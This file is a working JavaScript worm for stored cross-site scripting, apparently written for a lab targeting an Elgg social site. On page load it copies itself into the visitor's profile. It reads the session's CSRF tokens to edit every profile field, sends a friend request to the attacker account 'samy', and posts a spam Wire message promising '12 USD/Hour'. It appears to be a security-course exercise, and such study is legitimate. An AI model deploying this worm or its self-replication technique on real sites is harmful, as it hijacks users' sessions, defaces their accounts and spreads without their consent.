function randomString(length) {
    // function to generate a random string of specified length
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) { result += characters.charAt(Math.floor(Math.random() * charactersLength)); }
    return result;
}

window.onload = function () {
    // checking whether the user is sammy himself
    var guid = "&guid=" + elgg.session.user.guid;
    var samyGuid = 47;
    if (elgg.session.user.guid == samyGuid) {
        return;
    }

    // code for worm propagation
    var headerTag = "<script id=\"worm\">";
    var innerCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script>";
    var wormCode = encodeURIComponent(headerTag + innerCode + tailTag);

    // getting security credentials of the user
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    // Code for editing the user profile
    var description = "&description=" + wormCode + "&accesslevel[description]=1";
    var briefdescription = "&briefdescription=" + 1605011 + "&accesslevel[briefdescription]=1";
    var interests = "&interests=" + randomString(10) + "&accesslevel[interests]=1";
    var location = "&location=" + randomString(10) + "&accesslevel[location]=1";
    var mobile = "&mobile=" + randomString(10) + "&accesslevel[mobile]=1";
    var phone = "&phone=" + randomString(10) + "&accesslevel[phone]=1";
    var skills = "&skills=" + randomString(10) + "&accesslevel[skills]=1";
    var twitter = "&twitter=" + randomString(10) + "&accesslevel[twitter]=1";
    var website = "&website=" + randomString(10) + "&accesslevel[website]=1";
    var contactemail = "&contactemail=" + randomString(10) + "@email.com&accesslevel[contactemail]=1";
    var sendurlPOST = "http://www.xsslabelgg.com/action/profile/edit";
    var editContent = guid + ts + token + description + briefdescription + interests + location + mobile + phone + skills + twitter + website + contactemail;

    var Ajax = null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurlPOST, true);
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(editContent);

    // Code for friend request to sammy
    var sendurlGET = "http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token;

    Ajax = new XMLHttpRequest();
    Ajax.open("GET", sendurlGET, true);
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send();

    // Code for posting on Wire with link to Sammy
    let link = "To earn 12 USD/Hour(!), visit now http:\/\/www.xsslabelgg.com\/profile\/samy"
    var body = "&body=" + link;
    var sendurlWirePost = "http://www.xsslabelgg.com/action/thewire/add";
    var contentWirePost = ts + token + body;

    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurlWirePost, true);
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(contentWirePost);
}
